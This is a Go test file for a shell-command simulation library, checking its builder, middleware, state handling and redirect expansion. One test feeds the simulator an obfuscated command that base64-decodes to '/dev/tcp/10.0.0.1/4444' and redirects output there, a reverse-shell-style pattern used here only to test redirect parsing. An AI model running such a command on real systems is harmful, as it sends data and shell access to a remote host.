package libcommand_test

import (
	"context"
	"reflect"
	"testing"

	libcommand "github.com/nullptrpanic/libcommand"
)

func TestSimulationRequestPublicFields(t *testing.T) {
	typeOfRequest := reflect.TypeOf(libcommand.SimulationRequest{})
	fields := make([]string, typeOfRequest.NumField())
	for index := range fields {
		fields[index] = typeOfRequest.Field(index).Name
	}
	want := []string{"Source", "Env", "Args", "Stdin", "Files", "WorkingDir", "User"}
	if !reflect.DeepEqual(fields, want) {
		t.Fatalf("SimulationRequest fields = %#v, want %#v", fields, want)
	}
}

func TestPublicCommandTypes(t *testing.T) {
	invocation := &libcommand.Invocation{Name: "lark-cli"}
	result := &libcommand.CommandResult{Action: libcommand.CommandStop}
	if invocation.Name != "lark-cli" || result.Action != libcommand.CommandStop {
		t.Fatal("public command types are unavailable from the root package")
	}
}

func TestPublicUnifiedCommandAPI(t *testing.T) {
	var _ func(*libcommand.CommandContext, string) *libcommand.CommandResult = (*libcommand.CommandContext).StopUnresolved
	var _ func(*libcommand.CommandContext, string) error = (*libcommand.CommandContext).ChangeUser

	var command libcommand.Command = func(_ context.Context, current *libcommand.CommandContext, _ *libcommand.Invocation) (*libcommand.CommandResult, error) {
		return &libcommand.CommandResult{Stdout: []byte(current.State().Directory())}, nil
	}
	simulator := libcommand.NewBuilder().Command("inspect", command).Build()
	if err := simulator.Simulate(context.Background(), &libcommand.SimulationRequest{Source: "inspect"}); err != nil {
		t.Fatal(err)
	}
}

func TestCommandContextExposesExpandedRedirects(t *testing.T) {
	var got [][]*libcommand.Redirect
	simulator := libcommand.NewBuilder().
		Command("probe", func(_ context.Context, command *libcommand.CommandContext, _ *libcommand.Invocation) (*libcommand.CommandResult, error) {
			var redirects []*libcommand.Redirect
			for _, redirect := range command.Redirects() {
				copied := *redirect
				redirects = append(redirects, &copied)
			}
			got = append(got, redirects)
			return &libcommand.CommandResult{}, nil
		}).
		Build()
	source := `target=$(printf '%s' L2Rldi90Y3AvMTAuMC4wLjEvNDQ0NA== | base64 -d)
probe >"$target" 2>&1
probe`
	if err := simulator.Simulate(context.Background(), &libcommand.SimulationRequest{Source: source}); err != nil {
		t.Fatal(err)
	}
	want := []*libcommand.Redirect{
		{FD: 1, Operator: ">", Target: "/dev/tcp/10.0.0.1/4444"},
		{FD: 2, Operator: ">&", Target: "1"},
	}
	if len(got) < 2 || !reflect.DeepEqual(got[0], want) {
		t.Fatalf("redirects = %#v, want first call %#v and subsequent calls without redirects", got, want)
	}
	for _, redirects := range got[1:] {
		if len(redirects) != 0 {
			t.Fatalf("subsequent redirects = %#v, want none", redirects)
		}
	}
}

func TestPublicArgumentKinds(t *testing.T) {
	resolved := &libcommand.Argument{Kind: libcommand.ArgumentString, Value: "chat"}
	unresolved := &libcommand.Argument{Kind: libcommand.ArgumentUnresolved}
	invocation := &libcommand.Invocation{Args: []*libcommand.Argument{resolved, unresolved}}
	if invocation.Args[0].Value != "chat" || invocation.Args[1].Kind != libcommand.ArgumentUnresolved {
		t.Fatalf("arguments = %#v", invocation.Args)
	}
}

func TestPublicAPI(t *testing.T) {
	var _ func(*libcommand.Simulator, context.Context, *libcommand.SimulationRequest) error = (*libcommand.Simulator).Simulate

	var got *libcommand.Invocation
	handler := func(_ context.Context, _ *libcommand.CommandContext, invocation *libcommand.Invocation) (*libcommand.CommandResult, error) {
		got = invocation
		return &libcommand.CommandResult{}, nil
	}

	simulator := libcommand.NewBuilder().Command("lark-cli", handler).Build()
	if simulator == nil {
		t.Fatal("Build returned nil")
	}
	if got != nil {
		t.Fatal("handler ran during Build")
	}
}

func TestPublicStateMutation(t *testing.T) {
	var observed string
	simulator := libcommand.NewBuilder().
		Command("mutate", func(_ context.Context, command *libcommand.CommandContext, _ *libcommand.Invocation) (*libcommand.CommandResult, error) {
			if err := command.State().SetVariable("VALUE", "changed"); err != nil {
				return nil, err
			}
			return &libcommand.CommandResult{}, nil
		}).
		Command("observe", func(_ context.Context, command *libcommand.CommandContext, _ *libcommand.Invocation) (*libcommand.CommandResult, error) {
			observed, _, _ = command.State().Variable("VALUE")
			return &libcommand.CommandResult{}, nil
		}).
		Build()
	if err := simulator.Simulate(context.Background(), &libcommand.SimulationRequest{Source: "mutate; observe"}); err != nil {
		t.Fatal(err)
	}
	if observed != "changed" {
		t.Fatalf("observed state value = %q, want changed", observed)
	}
}

func TestBuilderUsesLastCommandRegistration(t *testing.T) {
	var calls []string
	first := func(context.Context, *libcommand.CommandContext, *libcommand.Invocation) (*libcommand.CommandResult, error) {
		calls = append(calls, "first")
		return &libcommand.CommandResult{}, nil
	}
	second := func(context.Context, *libcommand.CommandContext, *libcommand.Invocation) (*libcommand.CommandResult, error) {
		calls = append(calls, "second")
		return &libcommand.CommandResult{}, nil
	}
	simulator := libcommand.NewBuilder().
		Command("record", first).
		Command("record", second).
		Build()
	if err := simulator.Simulate(context.Background(), &libcommand.SimulationRequest{Source: "record"}); err != nil {
		t.Fatal(err)
	}
	if !reflect.DeepEqual(calls, []string{"second"}) {
		t.Fatalf("calls = %#v, want second registration", calls)
	}
}

func TestBuilderCommandMiddlewareWrapsAllCommandKinds(t *testing.T) {
	var calls []string
	record := func(next libcommand.Command) libcommand.Command {
		return func(ctx context.Context, command *libcommand.CommandContext, invocation *libcommand.Invocation) (*libcommand.CommandResult, error) {
			calls = append(calls, invocation.Name)
			return next(ctx, command, invocation)
		}
	}
	success := func(context.Context, *libcommand.CommandContext, *libcommand.Invocation) (*libcommand.CommandResult, error) {
		return &libcommand.CommandResult{}, nil
	}

	simulator := libcommand.NewBuilder().
		Middleware(record).
		Command("custom", success).
		Command("*", success).
		Build()
	if err := simulator.Simulate(context.Background(), &libcommand.SimulationRequest{
		Source: "echo builtin; custom; external",
	}); err != nil {
		t.Fatal(err)
	}
	if want := []string{"echo", "custom", "external"}; !reflect.DeepEqual(calls, want) {
		t.Fatalf("middleware calls = %#v, want %#v", calls, want)
	}
}

func TestBuilderCommandMiddlewareUsesRegistrationOrder(t *testing.T) {
	var calls []string
	middleware := func(name string) libcommand.CommandMiddleware {
		return func(next libcommand.Command) libcommand.Command {
			return func(ctx context.Context, command *libcommand.CommandContext, invocation *libcommand.Invocation) (*libcommand.CommandResult, error) {
				calls = append(calls, name+" before")
				result, err := next(ctx, command, invocation)
				calls = append(calls, name+" after")
				return result, err
			}
		}
	}

	simulator := new(libcommand.Builder).
		Middleware(middleware("first"), middleware("second")).
		Command("record", func(context.Context, *libcommand.CommandContext, *libcommand.Invocation) (*libcommand.CommandResult, error) {
			calls = append(calls, "command")
			return &libcommand.CommandResult{}, nil
		}).
		Build()
	if err := simulator.Simulate(context.Background(), &libcommand.SimulationRequest{Source: "record"}); err != nil {
		t.Fatal(err)
	}
	want := []string{"first before", "second before", "command", "second after", "first after"}
	if !reflect.DeepEqual(calls, want) {
		t.Fatalf("calls = %#v, want %#v", calls, want)
	}
}

func TestBuilderAcceptsShellCommandNames(t *testing.T) {
	handler := func(context.Context, *libcommand.CommandContext, *libcommand.Invocation) (*libcommand.CommandResult, error) {
		return &libcommand.CommandResult{}, nil
	}
	for _, name := range []string{".", "[", "break", "builtin", "command", "continue", "declare", "eval", "exec", "exit", "export", "let", "local", "readonly", "return", "source", "test", "typeset"} {
		t.Run(name, func(t *testing.T) {
			if simulator := libcommand.NewBuilder().Command(name, handler).Build(); simulator == nil {
				t.Fatal("Build() returned nil")
			}
		})
	}
}
